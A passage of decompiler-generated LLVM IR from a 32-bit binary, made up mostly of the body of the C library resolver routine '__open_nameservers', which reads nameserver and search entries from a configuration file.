  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 268, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 50, 49, 48, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 51, 26, 23, 21, 22, 24, 25, 30, 31, 32, 28, 27, 29, 33, 39, 40, 38, 37, 36, 34, 35, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 49, 44, 47, 45, 48, 50, 51, 46, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 26, 27, 25, 28, 29, 30, 31, 36, 37, 35, 34, 33, 32, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 11, 15, 19, 18, 14, 17, 16, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 27, 28, 29, 18, 20, 21, 17, 19, 16, 22, 15, 23, 24, 25, 26, 30, 96, 97, 36, 37, 31, 32, 33, 34, 35, 38, 39, 14, 40, 41, 52, 48, 45, 46, 47, 49, 3, 1, 2, 4, 5, 50, 44, 6, 51, 42, 43, 0, 53, 54, 59, 60, 61, 62, 63, 58, 56, 55, 57, 7, 64, 8, 9, 67, 68, 69, 66, 70, 71, 65, 72, 10, 11, 85, 86, 87, 82, 83, 84, 81, 80, 79, 78, 77, 73, 74, 75, 76, 88, 12, 13, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder i16* @global_var_8059ac4.280, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_805fd80.279, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805fd68.278 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_805fd68.278, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053049, { 1, 0 }
  uselistorder label %dec_label_pc_8053046, { 1, 0 }
  uselistorder label %dec_label_pc_8052fd6, { 1, 0 }
  uselistorder label %dec_label_pc_8052fc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052fad, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8052f88.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052f80, { 1, 0 }
  uselistorder label %dec_label_pc_8052f67, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052f1c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8052eba, { 1, 0 }
  uselistorder label %dec_label_pc_8052e8a, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8052e80, { 1, 0 }
  uselistorder label %dec_label_pc_8052e75, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052e72, { 1, 0 }
  uselistorder label %dec_label_pc_8052ded, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052d35, { 1, 0 }
  uselistorder label %dec_label_pc_8052bb7, { 1, 0 }
  uselistorder label %dec_label_pc_8052b80, { 1, 0 }
  uselistorder label %dec_label_pc_8052af2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80529fe, { 1, 0 }
  uselistorder label %dec_label_pc_80529e8, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8053058 = load i32, i32* @ebp, align 4
  store i32 134550975, i32* %stack_var_-216, align 4
  %v3_8053067 = ptrtoint i32* %stack_var_-216 to i32
  %v2_805306c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805306c, i32* @eax, align 4
  %v2_8053074 = call i32 @__pthread_return_void(i32 %v2_805306c, i32 134550975)
  %v1_8053080 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059ac8.220 to i32))
  store i32 %v1_8053080, i32* @eax, align 4
  %v0_8053088 = load i32, i32* @global_var_80601b4.221, align 4
  %tmp43 = icmp slt i32 %v0_8053088, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_805327f, label %dec_label_pc_8053095

dec_label_pc_8053095:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_80580d0.283 to i32), i32* %stack_var_-216, align 4
  %v2_80530a1 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805809e.284 to i32), i32 ptrtoint (i32* @global_var_80580d0.283 to i32))
  store i32 %v2_80530a1, i32* @eax, align 4
  store i32 %v2_80530a1, i32* @ebp, align 4
  %v1_80530ab = icmp eq i32 %v2_80530a1, 0
  %v1_80530ad = icmp eq i1 %v1_80530ab, false
  br i1 %v1_80530ad, label %dec_label_pc_805324a.preheader, label %dec_label_pc_80530b3

dec_label_pc_80530b3:                             ; preds = %dec_label_pc_8053095
  store i32 ptrtoint (i32* @global_var_80580d0.283 to i32), i32* %stack_var_-216, align 4
  %v2_80530bf = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_80580af.285 to i32), i32 ptrtoint (i32* @global_var_80580d0.283 to i32))
  store i32 %v2_80530bf, i32* @ebp, align 4
  %v1_80530c9 = icmp eq i32 %v2_80530bf, 0
  %v1_80530cb = icmp eq i1 %v1_80530c9, false
  br i1 %v1_80530cb, label %dec_label_pc_805324a.preheader, label %dec_label_pc_8053274

dec_label_pc_805324a.preheader:                   ; preds = %dec_label_pc_8053095, %dec_label_pc_80530b3
  %v2_8053251 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8053185 = add i32 %v3_8053067, 164
  %v0_805324a103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053251, i32* @ebx, align 4
  %v3_8053256104 = call i32 @fgets(i32 %v2_8053251, i32 128, i32 %v0_805324a103)
  store i32 %v3_8053256104, i32* @eax, align 4
  %v1_805325e105 = icmp eq i32 %v3_8053256104, 0
  %v1_8053260106 = icmp eq i1 %v1_805325e105, false
  br i1 %v1_8053260106, label %dec_label_pc_80530d7.preheader.lr.ph, label %dec_label_pc_8053266

dec_label_pc_80530d7.preheader.lr.ph:             ; preds = %dec_label_pc_805324a.preheader
  %v4_805316f = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_80530d7.preheader

dec_label_pc_80530d6:                             ; preds = %dec_label_pc_80530e1
  %v1_80530d6 = add i32 %v0_80530d657, 1
  store i32 %v1_80530d6, i32* @ebx, align 4
  %v1_80530d7 = inttoptr i32 %v1_80530d6 to i8*
  %v2_80530d7 = load i8, i8* %v1_80530d7, align 1
  %v3_80530d7 = zext i8 %v2_80530d7 to i32
  %v5_80530d7 = and i32 %v6_80530d760, -256
  %v6_80530d7 = or i32 %v3_80530d7, %v5_80530d7
  store i32 %v6_80530d7, i32* @ecx, align 4
  %v4_80530d9 = icmp eq i8 %v2_80530d7, 0
  br i1 %v4_80530d9, label %dec_label_pc_805324a.backedge, label %dec_label_pc_80530e1

dec_label_pc_80530e1:                             ; preds = %dec_label_pc_80530e1.lr.ph, %dec_label_pc_80530d6
  %v6_80530d760 = phi i32 [ %v6_80530d755, %dec_label_pc_80530e1.lr.ph ], [ %v6_80530d7, %dec_label_pc_80530d6 ]
  %v2_80530d759 = phi i8 [ %v2_80530d752, %dec_label_pc_80530e1.lr.ph ], [ %v2_80530d7, %dec_label_pc_80530d6 ]
  %v1_80530d758 = phi i8* [ %v1_80530d751, %dec_label_pc_80530e1.lr.ph ], [ %v1_80530d7, %dec_label_pc_80530d6 ]
  %v0_80530d657 = phi i32 [ %v0_80530d7.pre, %dec_label_pc_80530e1.lr.ph ], [ %v1_80530d6, %dec_label_pc_80530d6 ]
  %v2_80530e1 = sext i8 %v2_80530d759 to i32
  store i32 %v2_80530e1, i32* @edx, align 4
  store i32 %v0_80530e4.pre, i32* @eax, align 4
  %v2_80530e9 = mul nsw i32 %v2_80530e1, 2
  %v3_80530e9 = add i32 %v0_80530e4.pre, %v2_80530e9
  %v4_80530e9 = inttoptr i32 %v3_80530e9 to i8*
  %v5_80530e9 = load i8, i8* %v4_80530e9, align 1
  %v6_80530e9 = and i8 %v5_80530e9, 32
  %v7_80530e9 = icmp eq i8 %v6_80530e9, 0
  %v1_80530ed = icmp eq i1 %v7_80530e9, false
  br i1 %v1_80530ed, label %dec_label_pc_80530d6, label %dec_label_pc_80530ef

dec_label_pc_80530ef:                             ; preds = %dec_label_pc_80530e1
  %v10_80530ef = icmp eq i8 %v2_80530d759, 10
  br i1 %v10_80530ef, label %dec_label_pc_805324a.backedge, label %dec_label_pc_80530f8

dec_label_pc_805324a.backedge:                    ; preds = %dec_label_pc_80530d7.preheader, %dec_label_pc_80530d6, %dec_label_pc_8053210, %dec_label_pc_805323f, %dec_label_pc_8053217, %dec_label_pc_80530ef, %dec_label_pc_80530f8, %dec_label_pc_80531c9
  %v0_805324a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053251, i32* @ebx, align 4
  %v3_8053256 = call i32 @fgets(i32 %v2_8053251, i32 128, i32 %v0_805324a)
  store i32 %v3_8053256, i32* @eax, align 4
  %v1_805325e = icmp eq i32 %v3_8053256, 0
  %v1_8053260 = icmp eq i1 %v1_805325e, false
  br i1 %v1_8053260, label %dec_label_pc_80530d7.preheader, label %dec_label_pc_8053266

dec_label_pc_80530f8:                             ; preds = %dec_label_pc_80530ef
  %v10_8053100 = icmp eq i8 %v2_80530d759, 35
  %v1_8053103 = icmp eq i1 %v10_8053100, false
  br i1 %v1_8053103, label %dec_label_pc_8053154.preheader, label %dec_label_pc_805324a.backedge

dec_label_pc_8053154.preheader:                   ; preds = %dec_label_pc_80530f8
  %v2_80531546 = load i8, i8* %v1_80530d758, align 1
  %v3_80531547 = icmp eq i8 %v2_80531546, 0
  br i1 %v3_80531547, label %dec_label_pc_8053160, label %dec_label_pc_8053159

dec_label_pc_805310a:                             ; preds = %dec_label_pc_8053159
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_805310e = load i32, i32* @esp, align 4
  %v3_805310e = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_805310e = add nuw nsw i32 %v3_805310e, 152
  %v5_805310e = add i32 %v4_805310e, %v1_805310e
  %v6_805310e = inttoptr i32 %v5_805310e to i32*
  store i32 %v0_805310e, i32* %v6_805310e, align 4
  %v0_8053118.pre = load i32, i32* @ebx, align 4
  %v4_8053118.pre = load i32, i32* @ecx, align 4
  %v1_805311861 = inttoptr i32 %v0_8053118.pre to i8*
  %v2_805311862 = load i8, i8* %v1_805311861, align 1
  %v3_805311863 = zext i8 %v2_805311862 to i32
  %v5_805311864 = and i32 %v4_8053118.pre, -256
  %v6_805311865 = or i32 %v3_805311863, %v5_805311864
  %v4_805311a66 = icmp eq i8 %v2_805311862, 0
  br i1 %v4_805311a66, label %dec_label_pc_8053137.preheader, label %dec_label_pc_805311e.lr.ph

dec_label_pc_805311e.lr.ph:                       ; preds = %dec_label_pc_805310a
  %v0_8053121.pre = load i32, i32* @global_var_8059858, align 8
  br label %dec_label_pc_805311e

dec_label_pc_8053117:                             ; preds = %dec_label_pc_805312c
  %v1_8053117 = add i32 %v0_805311767, 1
  store i32 %v1_8053117, i32* @ebx, align 4
  %v1_8053118 = inttoptr i32 %v1_8053117 to i8*
  %v2_8053118 = load i8, i8* %v1_8053118, align 1
  %v3_8053118 = zext i8 %v2_8053118 to i32
  %v5_8053118 = and i32 %v6_805311869, -256
  %v6_8053118 = or i32 %v3_8053118, %v5_8053118
  %v4_805311a = icmp eq i8 %v2_8053118, 0
  br i1 %v4_805311a, label %dec_label_pc_8053137.preheader, label %dec_label_pc_805311e

dec_label_pc_805311e:                             ; preds = %dec_label_pc_805311e.lr.ph, %dec_label_pc_8053117
  %v6_805311869 = phi i32 [ %v6_805311865, %dec_label_pc_805311e.lr.ph ], [ %v6_8053118, %dec_label_pc_8053117 ]
  %v2_805311868 = phi i8 [ %v2_805311862, %dec_label_pc_805311e.lr.ph ], [ %v2_8053118, %dec_label_pc_8053117 ]
  %v0_805311767 = phi i32 [ %v0_8053118.pre, %dec_label_pc_805311e.lr.ph ], [ %v1_8053117, %dec_label_pc_8053117 ]
  %v2_805311e = sext i8 %v2_805311868 to i32
  store i32 %v2_805311e, i32* @edx, align 4
  store i32 %v0_8053121.pre, i32* @eax, align 4
  %v2_8053126 = mul nsw i32 %v2_805311e, 2
  %v3_8053126 = add i32 %v0_8053121.pre, %v2_8053126
  %v4_8053126 = inttoptr i32 %v3_8053126 to i8*
  %v5_8053126 = load i8, i8* %v4_8053126, align 1
  %v6_8053126 = and i8 %v5_8053126, 32
  %v7_8053126 = icmp eq i8 %v6_8053126, 0
  %v1_805312a = icmp eq i1 %v7_8053126, false
  br i1 %v1_805312a, label %dec_label_pc_8053137.preheader, label %dec_label_pc_805312c

dec_label_pc_805312c:                             ; preds = %dec_label_pc_805311e
  %v10_805312c = icmp eq i8 %v2_805311868, 10
  %v1_805312f = icmp eq i1 %v10_805312c, false
  br i1 %v1_805312f, label %dec_label_pc_8053117, label %dec_label_pc_8053137.preheader

dec_label_pc_8053137.preheader:                   ; preds = %dec_label_pc_805312c, %dec_label_pc_805311e, %dec_label_pc_8053117, %dec_label_pc_805310a
  %v0_8053117.lcssa = phi i32 [ %v0_8053118.pre, %dec_label_pc_805310a ], [ %v1_8053117, %dec_label_pc_8053117 ], [ %v0_805311767, %dec_label_pc_805311e ], [ %v0_805311767, %dec_label_pc_805312c ]
  %v6_8053118.lcssa = phi i32 [ %v6_805311865, %dec_label_pc_805310a ], [ %v6_8053118, %dec_label_pc_8053117 ], [ %v6_805311869, %dec_label_pc_805311e ], [ %v6_805311869, %dec_label_pc_805312c ]
  %v1_805313775 = inttoptr i32 %v0_8053117.lcssa to i8*
  %v2_805313776 = load i8, i8* %v1_805313775, align 1
  %v3_805313777 = zext i8 %v2_805313776 to i32
  %v5_805313778 = and i32 %v6_8053118.lcssa, -256
  %v6_805313779 = or i32 %v3_805313777, %v5_805313778
  store i32 %v6_805313779, i32* @ecx, align 4
  %v4_805313980 = icmp eq i8 %v2_805313776, 0
  br i1 %v4_805313980, label %dec_label_pc_8053150, label %dec_label_pc_805313d

dec_label_pc_8053133:                             ; preds = %dec_label_pc_805314b, %dec_label_pc_805313d
  store i8 0, i8* %v1_805313782, align 1
  %v0_8053136 = load i32, i32* @ebx, align 4
  %v1_8053136 = add i32 %v0_8053136, 1
  store i32 %v1_8053136, i32* @ebx, align 4
  %v4_8053137.pre = load i32, i32* @ecx, align 4
  %v1_8053137 = inttoptr i32 %v1_8053136 to i8*
  %v2_8053137 = load i8, i8* %v1_8053137, align 1
  %v3_8053137 = zext i8 %v2_8053137 to i32
  %v5_8053137 = and i32 %v4_8053137.pre, -256
  %v6_8053137 = or i32 %v3_8053137, %v5_8053137
  store i32 %v6_8053137, i32* @ecx, align 4
  %v4_8053139 = icmp eq i8 %v2_8053137, 0
  br i1 %v4_8053139, label %dec_label_pc_8053150, label %dec_label_pc_805313d

dec_label_pc_805313d:                             ; preds = %dec_label_pc_8053137.preheader, %dec_label_pc_8053133
  %v2_805313783 = phi i8 [ %v2_8053137, %dec_label_pc_8053133 ], [ %v2_805313776, %dec_label_pc_8053137.preheader ]
  %v1_805313782 = phi i8* [ %v1_8053137, %dec_label_pc_8053133 ], [ %v1_805313775, %dec_label_pc_8053137.preheader ]
  %v0_805315481 = phi i32 [ %v1_8053136, %dec_label_pc_8053133 ], [ %v0_8053117.lcssa, %dec_label_pc_8053137.preheader ]
  %v2_805313d = sext i8 %v2_805313783 to i32
  store i32 %v2_805313d, i32* @edx, align 4
  %v0_8053140 = load i32, i32* @global_var_8059858, align 8
  store i32 %v0_8053140, i32* @eax, align 4
  %v2_8053145 = mul nsw i32 %v2_805313d, 2
  %v3_8053145 = add i32 %v0_8053140, %v2_8053145
  %v4_8053145 = inttoptr i32 %v3_8053145 to i8*
  %v5_8053145 = load i8, i8* %v4_8053145, align 1
  %v6_8053145 = and i8 %v5_8053145, 32
  %v7_8053145 = icmp eq i8 %v6_8053145, 0
  %v1_8053149 = icmp eq i1 %v7_8053145, false
  br i1 %v1_8053149, label %dec_label_pc_8053133, label %dec_label_pc_805314b

dec_label_pc_805314b:                             ; preds = %dec_label_pc_805313d
  %v10_805314b = icmp eq i8 %v2_805313783, 10
  br i1 %v10_805314b, label %dec_label_pc_8053133, label %dec_label_pc_8053150

dec_label_pc_8053150:                             ; preds = %dec_label_pc_8053133, %dec_label_pc_805314b, %dec_label_pc_8053137.preheader
  %v0_8053154.lcssa = phi i32 [ %v0_8053117.lcssa, %dec_label_pc_8053137.preheader ], [ %v0_805315481, %dec_label_pc_805314b ], [ %v1_8053136, %dec_label_pc_8053133 ]
  %v1_8053137.lcssa = phi i8* [ %v1_805313775, %dec_label_pc_8053137.preheader ], [ %v1_805313782, %dec_label_pc_805314b ], [ %v1_8053137, %dec_label_pc_8053133 ]
  %v4_8053150 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8053154 = load i8, i8* %v1_8053137.lcssa, align 1
  %v3_8053154 = icmp eq i8 %v2_8053154, 0
  br i1 %v3_8053154, label %dec_label_pc_8053160, label %dec_label_pc_8053159

dec_label_pc_8053159:                             ; preds = %dec_label_pc_8053154.preheader, %dec_label_pc_8053150
  %v0_805310e = phi i32 [ %v0_8053154.lcssa, %dec_label_pc_8053150 ], [ %v0_80530d657, %dec_label_pc_8053154.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8053150, %dec_label_pc_8053150 ], [ 0, %dec_label_pc_8053154.preheader ]
  %v7_805315e = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_805315e, label %dec_label_pc_8053160, label %dec_label_pc_805310a

dec_label_pc_8053160:                             ; preds = %dec_label_pc_8053150, %dec_label_pc_8053159, %dec_label_pc_8053154.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8053154.preheader ], [ %v4_8053150, %dec_label_pc_8053150 ], [ %stack_var_-196.013, %dec_label_pc_8053159 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8053167 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80580c7.286 to i32), i32* %stack_var_-216, align 4
  %v5_805316f = call i32 @__GI_strcoll(i8* %v4_805316f, i32 ptrtoint ([11 x i8]* @global_var_80580c7.286 to i32), i32 %v0_8053167, i32 %v0_8053167)
  store i32 %v5_805316f, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_805317c = icmp eq i32 %v5_805316f, 0
  br i1 %v1_805317c, label %dec_label_pc_80531a4.preheader, label %dec_label_pc_80531b5

dec_label_pc_80531a4.preheader:                   ; preds = %dec_label_pc_8053160
  %v5_80531a890 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80531a890, label %dec_label_pc_80531aa.lr.ph, label %dec_label_pc_80531b5

dec_label_pc_80531aa.lr.ph:                       ; preds = %dec_label_pc_80531a4.preheader
  %v0_80531aa.pre = load i32, i32* @global_var_80601b4.221, align 4
  br label %dec_label_pc_80531aa

dec_label_pc_8053182:                             ; preds = %dec_label_pc_80531aa
  %v2_8053185 = mul i32 %v1_805318591, 4
  %v4_8053185 = add i32 %v2_8053185, %v3_8053185
  %v5_8053185 = inttoptr i32 %v4_8053185 to i32*
  %v6_8053185 = load i32, i32* %v5_8053185, align 4
  %v1_805318c = inttoptr i32 %v6_8053185 to i8*
  %v2_805318c = call i32 @__GI_strdup(i8* %v1_805318c)
  %v0_8053191 = load i32, i32* @esi, align 4
  %v1_8053191 = add i32 %v0_8053191, 1
  store i32 %v1_8053191, i32* @esi, align 4
  %v1_8053192 = load i32, i32* @ebx, align 4
  %v2_8053192 = mul i32 %v1_8053192, 4
  %v3_8053192 = add i32 %v2_8053192, 134611368
  %v4_8053192 = inttoptr i32 %v3_8053192 to i32*
  store i32 %v2_805318c, i32* %v4_8053192, align 4
  %v0_8053199 = load i32, i32* @ebx, align 4
  %v1_8053199 = add i32 %v0_8053199, 1
  store i32 %v1_8053199, i32* @eax, align 4
  store i32 %v1_8053199, i32* @global_var_80601b4.221, align 4
  %v0_80531a4.pre = load i32, i32* @esi, align 4
  %v5_80531a8 = icmp slt i32 %v0_80531a4.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80531a8, label %dec_label_pc_80531aa, label %dec_label_pc_80531b5

dec_label_pc_80531aa:                             ; preds = %dec_label_pc_80531aa.lr.ph, %dec_label_pc_8053182
  %v0_80531aa = phi i32 [ %v0_80531aa.pre, %dec_label_pc_80531aa.lr.ph ], [ %v1_8053199, %dec_label_pc_8053182 ]
  %v1_805318591 = phi i32 [ 1, %dec_label_pc_80531aa.lr.ph ], [ %v0_80531a4.pre, %dec_label_pc_8053182 ]
  store i32 %v0_80531aa, i32* @ebx, align 4
  %v7_80531b3 = icmp sgt i32 %v0_80531aa, 2
  br i1 %v7_80531b3, label %dec_label_pc_80531b5, label %dec_label_pc_8053182

dec_label_pc_80531b5:                             ; preds = %dec_label_pc_80531a4.preheader, %dec_label_pc_8053182, %dec_label_pc_80531aa, %dec_label_pc_8053160
  %v0_80531b5 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80580d2.287 to i32), i32* %stack_var_-216, align 4
  %v0_80531bc = load i32, i32* @edi, align 4
  %v4_80531bd = inttoptr i32 %v0_80531bc to i8*
  %v5_80531bd = call i32 @__GI_strcoll(i8* %v4_80531bd, i32 ptrtoint ([7 x i8]* @global_var_80580d2.287 to i32), i32 %v0_80531b5, i32 %v0_80531b5)
  store i32 %v5_80531bd, i32* @eax, align 4
  %v1_80531c5 = icmp eq i32 %v5_80531bd, 0
  br i1 %v1_80531c5, label %dec_label_pc_8053207.preheader, label %dec_label_pc_80531c9

dec_label_pc_80531c9:                             ; preds = %dec_label_pc_80531b5
  %v0_80531c9 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80580d9.288 to i32), i32* %stack_var_-216, align 4
  %v0_80531d0 = load i32, i32* @edi, align 4
  %v4_80531d1 = inttoptr i32 %v0_80531d0 to i8*
  %v5_80531d1 = call i32 @__GI_strcoll(i8* %v4_80531d1, i32 ptrtoint ([7 x i8]* @global_var_80580d9.288 to i32), i32 %v0_80531c9, i32 %v0_80531c9)
  %v1_80531d9 = icmp eq i32 %v5_80531d1, 0
  br i1 %v1_80531d9, label %dec_label_pc_8053207.preheader, label %dec_label_pc_805324a.backedge

dec_label_pc_8053207.preheader:                   ; preds = %dec_label_pc_80531b5, %dec_label_pc_80531c9
  %v0_805320792 = load i32, i32* @global_var_80601b8.281, align 8
  %tmp4594 = icmp slt i32 %v0_805320792, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_80531df, label %dec_label_pc_8053210

dec_label_pc_80531df:                             ; preds = %dec_label_pc_8053207.preheader, %dec_label_pc_80531df.dec_label_pc_80531df_crit_edge
  %v0_805320796 = phi i32 [ %v0_8053207, %dec_label_pc_80531df.dec_label_pc_80531df_crit_edge ], [ %v0_805320792, %dec_label_pc_8053207.preheader ]
  %v1_80531df = add i32 %v0_805320796, -1
  store i32 %v1_80531df, i32* @global_var_80601b8.281, align 8
  %v1_80531e8 = mul i32 %v1_80531df, 4
  %v2_80531e8 = add i32 %v1_80531e8, 134611352
  %v3_80531e8 = inttoptr i32 %v2_80531e8 to i32*
  %v4_80531e8 = load i32, i32* %v3_80531e8, align 4
  %v1_80531ef = call i32 @free(i32 %v4_80531e8)
  %v0_80531f4 = load i32, i32* @global_var_80601b8.281, align 8
  %v1_80531fc = mul i32 %v0_80531f4, 4
  %v2_80531fc = add i32 %v1_80531fc, ptrtoint (i32* @global_var_8060198.289 to i32)
  %v3_80531fc = inttoptr i32 %v2_80531fc to i32*
  store i32 0, i32* %v3_80531fc, align 4
  %v0_8053207 = load i32, i32* @global_var_80601b8.281, align 8
  %tmp45 = icmp slt i32 %v0_8053207, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_80531df.dec_label_pc_80531df_crit_edge, label %dec_label_pc_8053210

dec_label_pc_80531df.dec_label_pc_80531df_crit_edge: ; preds = %dec_label_pc_80531df
  br label %dec_label_pc_80531df

dec_label_pc_8053210:                             ; preds = %dec_label_pc_80531df, %dec_label_pc_8053207.preheader
  %v0_8053207.lcssa = phi i32 [ %v0_805320792, %dec_label_pc_8053207.preheader ], [ %v0_8053207, %dec_label_pc_80531df ]
  store i32 1, i32* @esi, align 4
  %v5_805323d100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805323d100, label %dec_label_pc_805323f, label %dec_label_pc_805324a.backedge

dec_label_pc_8053217:                             ; preds = %dec_label_pc_805323f
  %v2_805321a = mul i32 %v1_805321a102, 4
  %v4_805321a = add i32 %v2_805321a, %v3_8053185
  %v5_805321a = inttoptr i32 %v4_805321a to i32*
  %v6_805321a = load i32, i32* %v5_805321a, align 4
  %v1_8053221 = inttoptr i32 %v6_805321a to i8*
  %v2_8053221 = call i32 @__GI_strdup(i8* %v1_8053221)
  %v0_8053226 = load i32, i32* @esi, align 4
  %v1_8053226 = add i32 %v0_8053226, 1
  store i32 %v1_8053226, i32* @esi, align 4
  %v1_8053227 = load i32, i32* @ebx, align 4
  %v2_8053227 = mul i32 %v1_8053227, 4
  %v3_8053227 = add i32 %v2_8053227, 134611352
  %v4_8053227 = inttoptr i32 %v3_8053227 to i32*
  store i32 %v2_8053221, i32* %v4_8053227, align 4
  %v0_805322e = load i32, i32* @ebx, align 4
  %v1_805322e = add i32 %v0_805322e, 1
  store i32 %v1_805322e, i32* @global_var_80601b8.281, align 8
  %v0_8053239.pre = load i32, i32* @esi, align 4
  %v5_805323d = icmp slt i32 %v0_8053239.pre, %stack_var_-196.0.lcssa
  br i1 %v5_805323d, label %dec_label_pc_805323f, label %dec_label_pc_805324a.backedge

dec_label_pc_805323f:                             ; preds = %dec_label_pc_8053210, %dec_label_pc_8053217
  %v1_805321a102 = phi i32 [ %v0_8053239.pre, %dec_label_pc_8053217 ], [ 1, %dec_label_pc_8053210 ]
  %v0_805323f101 = phi i32 [ %v1_805322e, %dec_label_pc_8053217 ], [ %v0_8053207.lcssa, %dec_label_pc_8053210 ]
  store i32 %v0_805323f101, i32* @ebx, align 4
  %v7_8053248 = icmp sgt i32 %v0_805323f101, 3
  br i1 %v7_8053248, label %dec_label_pc_805324a.backedge, label %dec_label_pc_8053217

dec_label_pc_80530d7.preheader:                   ; preds = %dec_label_pc_80530d7.preheader.lr.ph, %dec_label_pc_805324a.backedge
  %v0_80530d7.pre = load i32, i32* @ebx, align 4
  %v4_80530d7.pre = load i32, i32* @ecx, align 4
  %v1_80530d751 = inttoptr i32 %v0_80530d7.pre to i8*
  %v2_80530d752 = load i8, i8* %v1_80530d751, align 1
  %v3_80530d753 = zext i8 %v2_80530d752 to i32
  %v5_80530d754 = and i32 %v4_80530d7.pre, -256
  %v6_80530d755 = or i32 %v3_80530d753, %v5_80530d754
  store i32 %v6_80530d755, i32* @ecx, align 4
  %v4_80530d956 = icmp eq i8 %v2_80530d752, 0
  br i1 %v4_80530d956, label %dec_label_pc_805324a.backedge, label %dec_label_pc_80530e1.lr.ph

dec_label_pc_80530e1.lr.ph:                       ; preds = %dec_label_pc_80530d7.preheader
  %v0_80530e4.pre = load i32, i32* @global_var_8059858, align 8
  br label %dec_label_pc_80530e1

dec_label_pc_8053266:                             ; preds = %dec_label_pc_805324a.backedge, %dec_label_pc_805324a.preheader
  %v0_8053269 = load i32, i32* @ebp, align 4
  %v1_805326a = inttoptr i32 %v0_8053269 to i16*
  %v2_805326a = call i32 @__GI_fclose(i16* %v1_805326a)
  br label %dec_label_pc_805327f

dec_label_pc_8053274:                             ; preds = %dec_label_pc_80530b3
  %v0_8053274 = call i32 @__GI___h_errno_location()
  %v1_8053279 = inttoptr i32 %v0_8053274 to i32*
  store i32 3, i32* %v1_8053279, align 4
  br label %dec_label_pc_805327f

dec_label_pc_805327f:                             ; preds = %entry, %dec_label_pc_8053266, %dec_label_pc_8053274
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_805306c, i32* @eax, align 4
  %v2_805328b = call i32 @__pthread_return_void(i32 %v2_805306c, i32 1)
  store i32 %v0_8053058, i32* @ebp, align 4
  ret i32 %v2_805328b

; uselistorder directives
  uselistorder i32 %v0_80530e4.pre, { 1, 0 }
  uselistorder i32 %v6_80530d755, { 1, 0 }
  uselistorder i8 %v2_80530d752, { 1, 2, 0 }
  uselistorder i8* %v1_80530d751, { 1, 0 }
  uselistorder i32 %v0_80530d7.pre, { 1, 0 }
  uselistorder i32 %v0_8053207, { 0, 2, 1 }
  uselistorder i32 %v1_80531df, { 1, 0 }
  uselistorder i32 %v0_80531aa, { 1, 0 }
  uselistorder i32 %v0_80531a4.pre, { 1, 0 }
